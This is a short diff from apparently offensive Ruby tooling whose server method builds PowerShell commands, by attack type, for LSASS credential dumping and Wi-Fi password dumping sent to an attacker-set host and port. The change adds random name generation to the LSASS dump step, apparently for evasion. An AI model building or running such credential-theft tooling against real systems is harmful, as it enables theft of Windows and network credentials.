@@ -18,7 +18,7 @@ def server(attack)
     return host,port,powershell_command
   elsif attack == 'lsass_dump'
     port = @server_setup.get_port
-    powershell_command1,powershell_command2 = powershell_lsass_dump(host,port)
+    powershell_command1,powershell_command2 = powershell_lsass_dump(host,port,random_name_gen)
     return host,port,powershell_command1,powershell_command2
   elsif attack == 'wifi_dump'
     port = @server_setup.get_port
